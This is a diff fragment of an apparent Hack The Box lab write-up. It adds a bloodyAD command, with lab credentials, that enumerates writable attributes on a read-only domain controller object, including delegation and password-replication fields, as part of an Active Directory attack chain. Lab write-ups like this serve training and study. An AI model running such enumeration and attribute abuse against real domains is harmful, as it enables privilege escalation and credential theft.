@@ -513,5 +513,30 @@ So if i can modify the password replication group i should be able to force a ca
 These attributes are crucial in this attack chain
 
 ```python
+❯❯❯ bloodyAD --host dc01.garfield.htb -d garfield.htb -u 'l.wilson_adm' -p 'Password123!' get writable --detail
 
+distinguishedName: CN=RODC01,OU=Domain Controllers,DC=garfield,DC=htb
+msDS-AllowedToActOnBehalfOfOtherIdentity: WRITE
+msDS-RevealOnDemandGroup: WRITE
+msDS-NeverRevealGroup: WRITE
+lastLogonTimestamp: WRITE
+managedBy: WRITE
+logonCount: WRITE
+accountExpires: WRITE
+profilePath: WRITE
+userParameters: WRITE
+pwdLastSet: WRITE
+userWorkstations: WRITE
+logonWorkstation: WRITE
+logonHours: WRITE
+scriptPath: WRITE
+lastLogon: WRITE
+lastLogoff: WRITE
+homeDrive: WRITE
+homeDirectory: WRITE
+badPwdCount: WRITE
+userAccountControl: WRITE
+
+...[SNIP]...
 ```
+
